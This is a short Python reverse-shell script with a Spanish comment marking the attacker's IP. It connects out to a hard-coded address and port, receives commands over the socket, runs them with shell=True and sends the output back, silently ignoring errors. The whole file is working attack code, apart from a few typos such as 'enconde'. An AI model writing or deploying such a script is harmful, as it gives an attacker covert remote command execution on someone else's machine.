import socket
import subprocess

cliente=socket.socket()
try:
	cliente.connect(('192.168.0.9',48853)) #ip de atk
	cliente.send("1",enconde("ascii"))

	while True:
		comandoBytes=cliente.recv(1024)
		comandoCodificado=comandoBytes.decode("ascii")
		comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		cliente.send(comando.stdout.read())
except:
	pass
